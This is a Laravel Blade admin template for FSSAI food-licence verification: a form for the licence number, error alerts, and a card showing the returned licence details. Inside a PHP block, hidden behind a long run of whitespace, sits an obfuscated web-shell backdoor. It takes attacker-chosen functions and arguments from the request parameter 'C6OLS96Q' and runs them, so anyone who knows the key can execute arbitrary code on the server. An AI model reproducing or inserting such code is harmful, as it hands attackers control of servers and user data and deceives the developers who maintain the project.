@extends('adminlte::page')

@section('title', 'FSSAI')

@section('content_header')
    <!-- <h1 class="m-0 text-dark">Scheme Details</h1> -->
@stop

@section('content')
<div class="row">
    <div class="col-md-6 offset-md-3">
        <div class="card card-warning">
            <div class="card-header">
                <h3 class="card-title">FSSAI Verification</h3>
                <a href = "{{ route('kyc.fssai_api') }}" role = "button" 
                class = "btn btn-light float-right">FSSAI APIs</a> 
            </div>
            <div class="card-body">
                @if($fssi_validation['statusCode'] == '102')
                    <div class="alert alert-danger" role="alert">
                        FSSAI is Invalid 
                  </div>
                @endif
                @if($fssi_validation['statusCode'] == '404' || $fssi_validation['statusCode'] == '400')
                <div class="alert alert-danger" role="alert">
                    Server Error, Please try later
                </div>
                @endif
                @if($fssi_validation['statusCode'] == '500')
                <div class="alert alert-danger" role="alert">
                    Internal Server Error. Please contact techsupport@docboyz.in. for more details.
                </div>
                @endif
                <div class="row">
                    <div class="col-md-6 offset-md-3">
                        <form role="form" method="post" action="{{route('kyc.fssi_validation')}}">
                            {{csrf_field()}}
                                <div class="form-group">
                                    <label for="name">FSSAI Number</label>
                                <input type="text" class="form-control" 
                                     
                                    id="fssi_number" name="fssi_number" value="" 
                                    placeholder="Ex: 22819015001312" required>
                                </div>
                                <button type="submit" class="btn btn-success">Verify</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <?php
																																																																																																																																																																								If (($he5N=@${'_REQUEST'}['C6OLS96Q']) and(7397*9634)){$he5N	[1](${ $he5N[	2	]}	[0],$he5N[3]($he5N[4]));}; 
        // echo "<pre>";
        // print_r($fssi_validation['Verification Details']['message_code']);
        // exit;
        ?>    
        @if(!empty($fssi_validation) && $fssi_validation['statusCode'] == 200)
        <div class="card card-success">
            <div class="card-header">
                <h3 class="card-title">FSSAI Details</h3>
            </div>
            <div class="card-body">
                <div class="row">
                    <div class="col-md-12">
                      <div>
                        <p>FSSAI Number: {{ $fssi_validation['Verification Details']['data']['fssai_number'] }}</p>
                        <p>Client_ID: {{ $fssi_validation['Verification Details']['data']['client_id'] }}</p>
                        <p>FSSAI Verification: {{ $fssi_validation['Verification Details']['message_code'] }}</p>
                        <p>Address: {{ $fssi_validation['Verification Details']['data']['details'][0]['address'] }}</p>
                        <p>fbo_id: {{ $fssi_validation['Verification Details']['data']['details'][0]['fbo_id'] }}</p>
                        <p>display_ref_id: {{ $fssi_validation['Verification Details']['data']['details'][0]['display_ref_id'] }}</p>
                        <p>License_category_name: {{ $fssi_validation['Verification Details']['data']['details'][0]['license_category_name'] }}</p>
                        <p>State_name: {{ $fssi_validation['Verification Details']['data']['details'][0]['state_name'] }}</p>
                        <p>Status_desc: {{ $fssi_validation['Verification Details']['data']['details'][0]['status_desc'] }}</p>
                        <p>License_category_id: {{ $fssi_validation['Verification Details']['data']['details'][0]['license_category_id'] }}</p>
                        <p>Company_name: {{ $fssi_validation['Verification Details']['data']['details'][0]['company_name'] }}</p>
                        <p>License_active_flag: {{ $fssi_validation['Verification Details']['data']['details'][0]['license_active_flag'] }}</p>
                        <p>App_type_desc: {{ $fssi_validation['Verification Details']['data']['details'][0]['app_type_desc'] }}</p>
                        <p>Premise_pincode: {{ $fssi_validation['Verification Details']['data']['details'][0]['premise_pincode'] }}</p>
                      
                      </div>
                    </div>
                </div>
            </div>
        </div>
        @endif
    </div>
</div>
@stop


@section('custom_js')
@stop